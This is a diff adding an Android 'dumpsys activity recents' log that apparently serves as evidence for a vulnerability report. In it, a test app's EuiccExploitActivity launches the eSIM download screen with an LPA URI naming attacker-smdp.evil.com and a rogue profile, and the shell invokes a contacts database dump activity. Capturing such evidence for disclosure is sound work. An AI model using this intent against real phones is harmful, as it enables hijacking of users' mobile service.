@@ -1,0 +1,167 @@
+ACTIVITY MANAGER RECENT TASKS (dumpsys activity recents)
+mRecentsUid=10247
+mRecentsComponent=ComponentInfo{com.google.android.apps.nexuslauncher/com.android.quickstep.RecentsActivity}
+mFreezeTaskListReordering=false
+mFreezeTaskListReorderingPendingTimeout=false
+mHiddenTasks=[Task{ba19c6f #599 type=standard A=10392:com.vrp.zeroperm}, Task{5b32fff #595 type=standard A=10392:com.vrp.zeroperm}, Task{e53191f #594 type=standard A=10392:com.vrp.zeroperm}, Task{7ae2655 #593 type=standard A=10392:com.vrp.zeroperm}, Task{6efd074 #592 type=standard A=10392:com.vrp.zeroperm}, Task{8ef6b85 #589 type=standard A=10392:com.vrp.zeroperm}, Task{1c8a6a1 #586 type=standard A=10266:com.google.android.gms}, Task{867c6a9 #561 type=standard A=10391:com.vrp.zeroperm}, Task{3a7e423 #556 type=standard A=10390:com.vrp.zeroperm}, Task{4c21d5e #555 type=standard A=10390:com.vrp.zeroperm}, Task{502af5f #539 type=standard A=10266:com.google.android.gms}, Task{226d955 #520 type=standard A=10134:com.android.vending}, Task{f995dfb #515 type=standard A=10266:com.google.android.gms}, Task{5c8225a #513 type=standard A=10266:com.google.android.gms}, Task{f1daf95 #478 type=standard A=10386:com.vrp.poc}, Task{37c398a #477 type=standard A=10386:com.vrp.poc}]
+  Recent tasks:
+  * Recent #0: Task{75ecdca #631 type=standard A=10177:com.google.android.euicc}
+    userId=0 effectiveUid=u0a177 mCallingUid=u0a393 mUserSetupComplete=true mCallingPackage=com.vrp.zeroperm mCallingFeatureId=null
+    affinity=10177:com.google.android.euicc
+    intent={act=android.intent.action.VIEW dat=LPA:1$attacker-smdp.evil.com$ROGUE_ESIM_PROFILE flg=0x10000000 xflg=0x4 cmp=com.google.android.euicc/com.android.euicc.ui.activation.QrDownloadActivity}
+    mActivityComponent=com.google.android.euicc/com.android.euicc.ui.activation.QrDownloadActivity
+    autoRemoveRecents=false isPersistable=true activityType=1
+    rootWasReset=false mNeverRelinquishIdentity=true mReuseTask=false mLockTaskAuth=LOCK_TASK_AUTH_PINNABLE
+    Activities=[ActivityRecord{84790229 u0 com.google.android.euicc/com.android.euicc.ui.activation.ActivationActivityMigrated t631}, ActivityRecord{16500477 u0 com.google.android.euicc/com.android.euicc.ui.activation.PreActivationActivityMigrated t631}, ActivityRecord{161084496 u0 com.google.android.euicc/com.android.euicc.ui.dialog.CurrentSwitchConfirmDialogActivity t631}]
+    mRootProcess=ProcessRecord{856312c 14151:com.google.android.euicc/u0a177}
+    taskId=631 rootTaskId=631
+    hasChildPipActivity=false
+    mHasBeenVisible=true
+    mResizeMode=RESIZE_MODE_RESIZEABLE_VIA_SDK_VERSION mSupportsPictureInPicture=false isResizeable=true
+    isPerceptible=false
+    lastActiveTime=697924820 (inactive for 145s)
+     isTrimmable=true isForceHidden=false isForceExcludedFromRecents=false
+    mSelfMovable=0
+    mHandlePackageUpdate=true
+  * Recent #1: Task{ff3ee81 #630 type=standard A=10393:com.vrp.zeroperm}
+    userId=0 effectiveUid=u0a393 mCallingUid=2000 mUserSetupComplete=true mCallingPackage=com.android.shell mCallingFeatureId=null
+    affinity=10393:com.vrp.zeroperm
+    intent={flg=0x10000000 xflg=0x4 cmp=com.vrp.zeroperm/.EuiccExploitActivity}
+    mActivityComponent=com.vrp.zeroperm/.EuiccExploitActivity
+    autoRemoveRecents=false isPersistable=true activityType=1
+    rootWasReset=false mNeverRelinquishIdentity=true mReuseTask=false mLockTaskAuth=LOCK_TASK_AUTH_PINNABLE
+    Activities=[]
+    mRootProcess=ProcessRecord{a24fd98 14220:com.vrp.zeroperm/u0a393}
+    taskId=630 rootTaskId=630
+    hasChildPipActivity=false
+    mHasBeenVisible=false
+    mResizeMode=RESIZE_MODE_RESIZEABLE_VIA_SDK_VERSION mSupportsPictureInPicture=false isResizeable=true
+    isPerceptible=false
+    lastActiveTime=697924571 (inactive for 145s)
+     isTrimmable=true isForceHidden=false isForceExcludedFromRecents=false
+    mSelfMovable=0
+    mHandlePackageUpdate=true
+  * Recent #2: Task{a744440 #627 type=standard I=com.google.android.apps.wellbeing/.mindfulnudge.ui.MindfulNudgeActivity}
+    userId=0 effectiveUid=u0a127 mCallingUid=u0a127 mUserSetupComplete=true mCallingPackage=com.google.android.apps.wellbeing mCallingFeatureId=null
+    intent={flg=0x16010000 xflg=0x4 pkg=com.google.android.apps.wellbeing cmp=com.google.android.apps.wellbeing/.mindfulnudge.ui.MindfulNudgeActivity}
+    mActivityComponent=com.google.android.apps.wellbeing/.mindfulnudge.ui.MindfulNudgeActivity
+    autoRemoveRecents=false isPersistable=true activityType=1
+    rootWasReset=false mNeverRelinquishIdentity=true mReuseTask=false mLockTaskAuth=LOCK_TASK_AUTH_PINNABLE
+    Activities=[ActivityRecord{155014083 u0 com.google.android.apps.wellbeing/.mindfulnudge.ui.MindfulNudgeActivity t627}]
+    mRootProcess=ProcessRecord{e025ece 31746:com.google.android.apps.wellbeing/u0a127}
+    taskId=627 rootTaskId=627
+    hasChildPipActivity=false
+    mHasBeenVisible=true
+    mResizeMode=RESIZE_MODE_RESIZEABLE_VIA_SDK_VERSION mSupportsPictureInPicture=false isResizeable=true
+    isPerceptible=false
+    lastActiveTime=697924510 (inactive for 145s)
+     isTrimmable=true isForceHidden=false isForceExcludedFromRecents=false
+    mSelfMovable=0
+    mHandlePackageUpdate=true
+  * Recent #3: Task{31627e3 #626 type=standard I=com.google.android.gms/.growth.featuredrops.activity.FeatureDropsActivity}
+    userId=0 effectiveUid=u0a266 mCallingUid=2000 mUserSetupComplete=true mCallingPackage=com.android.shell mCallingFeatureId=null
+    intent={flg=0x10000000 xflg=0x5 cmp=com.google.android.gms/.growth.featuredrops.activity.FeatureDropsActivity}
+    mActivityComponent=com.google.android.gms/.growth.featuredrops.activity.FeatureDropsActivity
+    autoRemoveRecents=false isPersistable=true activityType=1
+    rootWasReset=false mNeverRelinquishIdentity=true mReuseTask=false mLockTaskAuth=LOCK_TASK_AUTH_PINNABLE
+    Activities=[ActivityRecord{131974162 u0 com.google.android.gms/.growth.featuredrops.activity.FeatureDropsActivity t626}]
+    mRootProcess=ProcessRecord{73d4f94 30176:com.google.android.gms.ui/u0a266}
+    taskId=626 rootTaskId=626
+    hasChildPipActivity=false
+    mHasBeenVisible=true
+    mResizeMode=RESIZE_MODE_RESIZEABLE_VIA_SDK_VERSION mSupportsPictureInPicture=false isResizeable=true
+    isPerceptible=false
+    lastActiveTime=697378729 (inactive for 691s)
+     isTrimmable=true isForceHidden=false isForceExcludedFromRecents=false
+    mSelfMovable=0
+    mHandlePackageUpdate=true
+  * Recent #4: Task{de15179 #624 type=standard I=com.google.android.apps.safetyhub/.medicalinfo.ui.MedicalInfoSettings}
+    userId=0 effectiveUid=u0a162 mCallingUid=2000 mUserSetupComplete=true mCallingPackage=com.android.shell mCallingFeatureId=null
+    intent={act=android.intent.action.VIEW dat=safetyhub://medicalinfo flg=0x10800000 xflg=0x4 cmp=com.google.android.apps.safetyhub/.medicalinfo.ui.MedicalInfoSettings}
+    origActivity=com.google.android.apps.safetyhub/.medicalinfo.ui.MedicalInfoSettings
+    mActivityComponent=com.google.android.apps.safetyhub/com.google.apps.tiktok.nav.gateway.GatewayActivity
+    rootWasReset=false mNeverRelinquishIdentity=true mReuseTask=false mLockTaskAuth=LOCK_TASK_AUTH_PINNABLE
+    Activities=[ActivityRecord{266303228 u0 com.google.android.apps.safetyhub/.medicalinfo.ui.MedicalInfoSettingsActivity t624}]
+    taskId=624 rootTaskId=624
+    hasChildPipActivity=false
+    mHasBeenVisible=true
+    mResizeMode=RESIZE_MODE_RESIZEABLE_VIA_SDK_VERSION mSupportsPictureInPicture=false isResizeable=true
+    isPerceptible=false
+    lastActiveTime=697378647 (inactive for 691s)
+     isTrimmable=true isForceHidden=false isForceExcludedFromRecents=false
+    mSelfMovable=0
+    mHandlePackageUpdate=true
+  * Recent #5: Task{eaa4393 #2 type=home I=com.google.android.apps.nexuslauncher/.NexusLauncherActivity}
+    userId=0 effectiveUid=u0a247 mCallingUid=0 mUserSetupComplete=true mCallingPackage=null mCallingFeatureId=null
+    intent={act=android.intent.action.MAIN cat=[android.intent.category.HOME] flg=0x10000100 cmp=com.google.android.apps.nexuslauncher/.NexusLauncherActivity}
+    mActivityComponent=com.google.android.apps.nexuslauncher/.NexusLauncherActivity
+    autoRemoveRecents=false isPersistable=true activityType=2
+    rootWasReset=false mNeverRelinquishIdentity=true mReuseTask=false mLockTaskAuth=LOCK_TASK_AUTH_PINNABLE
+    Activities=[TaskFragment{6c23460 mode=multi-window}, ActivityRecord{165507021 u0 com.google.android.apps.nexuslauncher/.NexusLauncherActivity t2}]
+    mRootProcess=ProcessRecord{23a8c3e 22418:com.google.android.apps.nexuslauncher/u0a247}
+    taskId=2 rootTaskId=1
+    hasChildPipActivity=false
+    mHasBeenVisible=true
+    mResizeMode=RESIZE_MODE_RESIZEABLE mSupportsPictureInPicture=false isResizeable=true
+    isPerceptible=false
+    lastActiveTime=697062764 (inactive for 1007s)
+     isTrimmable=true isForceHidden=false isForceExcludedFromRecents=false
+    mSelfMovable=0
+    mHandlePackageUpdate=false
+  * Recent #6: Task{da25a7b #622 type=standard A=10086:com.android.providers.contacts}
+    userId=0 effectiveUid=u0a86 mCallingUid=2000 mUserSetupComplete=true mCallingPackage=com.android.shell mCallingFeatureId=null
+    affinity=10086:com.android.providers.contacts
+    intent={act=com.android.providers.contacts.DUMP_DATABASE flg=0x10000000 xflg=0x4 cmp=com.android.providers.contacts/.debug.ContactsDumpActivity}
+    mActivityComponent=com.android.providers.contacts/.debug.ContactsDumpActivity
+    autoRemoveRecents=false isPersistable=true activityType=1
+    rootWasReset=false mNeverRelinquishIdentity=true mReuseTask=false mLockTaskAuth=LOCK_TASK_AUTH_PINNABLE
+    Activities=[]
+    mRootProcess=ProcessRecord{aa60862 30619:android.process.acore/u0a86}
+    taskId=622 rootTaskId=622
+    hasChildPipActivity=false
+    mHasBeenVisible=false
+    mResizeMode=RESIZE_MODE_RESIZEABLE_VIA_SDK_VERSION mSupportsPictureInPicture=false isResizeable=true
+    isPerceptible=false
+    lastActiveTime=697058200 (inactive for 1011s)
+     isTrimmable=true isForceHidden=false isForceExcludedFromRecents=false
+    mSelfMovable=0
+    mHandlePackageUpdate=true
+
+  Visible recent tasks (most recent first):
+  * RecentTaskInfo #0: 
+    id=631 userId=0 hasTask=true lastActiveTime=697924820
+    baseIntent=Intent { act=android.intent.action.VIEW dat=LPA: flg=0x10000000 cmp=com.google.android.euicc/com.android.euicc.ui.activation.QrDownloadActivity }
+    baseActivity={com.google.android.euicc/com.android.euicc.ui.activation.ActivationActivityMigrated}
+    topActivity={com.google.android.euicc/com.android.euicc.ui.dialog.CurrentSwitchConfirmDialogActivity}
+    realActivity={com.google.android.euicc/com.android.euicc.ui.activation.QrDownloadActivity}
+    isExcluded=false activityType=standard windowingMode=fullscreen supportsMultiWindow=true
+    taskDescription { colorBackground=#ff1f1810 colorPrimary=#ff201b15 iconRes=/0 iconBitmap=false resizeMode=RESIZE_MODE_RESIZEABLE_VIA_SDK_VERSION minWidth=-1 minHeight=-1 colorBackgroundFloating=#ff424242 }
+     * RecentTaskInfo #1: 
+    id=630 userId=0 hasTask=false lastActiveTime=697924571
+    baseIntent=Intent { flg=0x10000000 cmp=com.vrp.zeroperm/.EuiccExploitActivity }
+    realActivity={com.vrp.zeroperm/com.vrp.zeroperm.EuiccExploitActivity}
+    isExcluded=false activityType=standard windowingMode=fullscreen supportsMultiWindow=true
+    taskDescription { colorBackground=#fffaebdd colorPrimary=#ff201b15 iconRes=/0 iconBitmap=false resizeMode=RESIZE_MODE_RESIZEABLE_VIA_SDK_VERSION minWidth=-1 minHeight=-1 colorBackgroundFloating=#fffaefe4 }
+     * RecentTaskInfo #2: 
+    id=627 userId=0 hasTask=true lastActiveTime=697924510
+    baseIntent=Intent { flg=0x16010000 pkg=com.google.android.apps.wellbeing cmp=com.google.android.apps.wellbeing/.mindfulnudge.ui.MindfulNudgeActivity }
+    baseActivity={com.google.android.apps.wellbeing/com.google.android.apps.wellbeing.mindfulnudge.ui.MindfulNudgeActivity}
+    topActivity={com.google.android.apps.wellbeing/com.google.android.apps.wellbeing.mindfulnudge.ui.MindfulNudgeActivity}
+    realActivity={com.google.android.apps.wellbeing/com.google.android.apps.wellbeing.mindfulnudge.ui.MindfulNudgeActivity}
+    isExcluded=false activityType=standard windowingMode=fullscreen supportsMultiWindow=true
+    taskDescription { colorBackground=#ff202124 colorPrimary=#ff202124 iconRes=/0 iconBitmap=false resizeMode=RESIZE_MODE_RESIZEABLE_VIA_SDK_VERSION minWidth=-1 minHeight=-1 colorBackgroundFloating=#ff424242 }
+     * RecentTaskInfo #3: 
+    id=626 userId=0 hasTask=true lastActiveTime=697378729
+    baseIntent=Intent { flg=0x10000000 cmp=com.google.android.gms/.growth.featuredrops.activity.FeatureDropsActivity }
+    baseActivity={com.google.android.gms/com.google.android.gms.growth.featuredrops.activity.FeatureDropsActivity}
+    topActivity={com.google.android.gms/com.google.android.gms.growth.featuredrops.activity.FeatureDropsActivity}
+    realActivity={com.google.android.gms/com.google.android.gms.growth.featuredrops.activity.FeatureDropsActivity}
+    isExcluded=false activityType=standard windowingMode=fullscreen supportsMultiWindow=true
+    taskDescription { colorBackground=#ff000000 colorPrimary=#ff222222 iconRes=/0 iconBitmap=false resizeMode=RESIZE_MODE_RESIZEABLE_VIA_SDK_VERSION minWidth=-1 minHeight=-1 colorBackgroundFloating=#ff000000 }
+     * RecentTaskInfo #4: 
+    id=622 userId=0 hasTask=false lastActiveTime=697058200
+    baseIntent=Intent { act=com.android.providers.contacts.DUMP_DATABASE flg=0x10000000 cmp=com.android.providers.contacts/.debug.ContactsDumpActivity }
+    realActivity={com.android.providers.contacts/com.android.providers.contacts.debug.ContactsDumpActivity}
+    isExcluded=false activityType=standard windowingMode=fullscreen supportsMultiWindow=true
+    taskDescription { colorBackground=#ff000000 colorPrimary=#ff222222 iconRes=/0 iconBitmap=false resizeMode=RESIZE_MODE_RESIZEABLE_VIA_SDK_VERSION minWidth=-1 minHeight=-1 colorBackgroundFloating=#ff000000 }
+   
